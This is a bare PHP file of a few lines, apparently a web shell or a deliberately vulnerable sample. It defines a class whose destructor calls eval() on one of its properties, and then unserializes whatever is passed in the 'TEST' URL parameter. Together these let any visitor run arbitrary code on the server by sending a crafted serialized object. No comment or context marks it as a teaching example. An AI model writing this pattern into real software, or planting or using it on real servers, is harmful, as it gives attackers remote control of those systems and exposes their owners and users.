<?php
class A {
	public $a = "1";
	public function __destruct() {
		eval ( $this->a );
	}
}

unserialize ( $_GET ["TEST"] );

?>